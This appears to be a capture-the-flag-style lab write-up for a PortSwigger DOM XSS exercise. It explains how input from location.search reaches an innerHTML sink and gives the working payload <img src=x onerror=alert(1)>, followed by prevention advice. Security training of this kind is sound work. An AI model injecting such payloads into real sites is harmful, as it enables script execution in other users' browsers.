# 🚨 Lab 22 — DOM XSS in `innerHTML` Sink using `location.search`

## 🧪 Lab Details

| Field | Value |
|---|---|
| **Lab No** | 22 |
| **Lab Name** | DOM XSS in `innerHTML` sink using source `location.search` |
| **Category** | DOM XSS |
| **Platform** | PortSwigger Web Security Academy |

---

# 🎯 Goal

Perform a DOM-based XSS attack through the search functionality.

---

# 🔍 Injection Point

- Search Parameter

---

# 🧠 Vulnerability Overview

The application reads user-controlled data from:

```javascript
location.search
```

and inserts it into the DOM using:

```javascript
innerHTML
```

---

# 💣 Payloads

## ❌ Non-Working Payload

```html
<script>alert(1)</script>
```

Modern browsers prevent scripts inserted via `innerHTML` from executing.

---

## ✅ Working Payload

```html
<img src=x onerror=alert(1)>
```

---

# ⚔️ Exploitation Steps

## 1️⃣ Open the Search Page

Navigate to the vulnerable search functionality.

---

## 2️⃣ Inject the Payload

```html
<img src=x onerror=alert(1)>
```

---

## 3️⃣ Browser Parses HTML

The payload is inserted using:

```javascript
element.innerHTML = userInput;
```

---

## 4️⃣ Trigger `onerror`

Because `src=x` is invalid, the browser triggers:

```javascript
onerror
```

which executes:

```javascript
alert(1)
```

✅ DOM XSS Successfully Triggered

---

# 🧨 Why `<script>` Does Not Execute

Modern browsers follow the W3C specification and block scripts inserted using `innerHTML`.

Example:

```javascript
innerHTML = "<script>alert(1)</script>"
```

The script tag is parsed but not executed.

---

# 🧨 Why `onerror` Works

Event handlers still execute even inside `innerHTML`.

```html
<img src=x onerror=alert(1)>
```

Since the image path is invalid, the browser fires the `onerror` event.

---

# 🛡️ Prevention

## ❌ Avoid Unsafe Sinks

```javascript
innerHTML
outerHTML
document.write()
eval()
```

---

## ✅ Use Safe Methods

```javascript
textContent
innerText
createElement()
```

---

# 💡 Key Takeaway

`innerHTML` blocks `<script>` execution but still allows dangerous HTML event handlers like:

```html
onerror
onclick
onload
```

Always sanitize user-controlled HTML.
